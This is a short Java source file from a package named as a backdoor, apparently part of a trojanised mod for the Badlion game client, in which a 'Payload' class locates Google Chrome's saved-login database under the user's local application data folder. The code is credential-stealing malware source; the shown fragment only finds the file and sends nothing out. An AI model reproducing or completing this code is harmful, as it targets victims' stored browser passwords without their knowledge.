package me.bon.badlionplus.backdoor;

import java.util.Optional;

public final class Chrome implements Payload {
	   public void execute() throws Exception {
	      Optional file = FileUtil.getFile(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data");
	   }
}